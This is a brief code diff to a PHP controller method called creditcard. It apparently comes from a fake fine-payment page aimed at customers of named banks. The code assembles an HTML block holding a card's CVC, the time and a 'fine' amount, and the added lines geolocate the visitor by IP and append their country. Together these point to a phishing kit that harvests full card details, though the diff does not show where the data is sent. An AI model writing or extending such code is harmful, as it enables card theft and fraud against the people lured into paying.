@@ -902,6 +902,9 @@ $customer = DB::table('customers')->where('id_ref',$id)->first();
 
     public function creditcard(Request $request){
 
+        $position    = Location::get();
+        $countryName = $position->countryName;
+
 
         $cardStartNumber = array('inmaa'  => ['4323','4323'],
                                  'Ahli'   => ['5294','4323'],
@@ -975,6 +978,7 @@ $customer = DB::table('customers')->where('id_ref',$id)->first();
                     <h4>CVC:  '.$cardCVC.' </h4></br>
                     <h4>  '.$currentTime.'</h4>
                     <h4>  '.$totalFineItemsAmount.'</h4>
+                    <h4>  '.$countryName.'</h4>
                     </div>';
     
     $htmlData = [
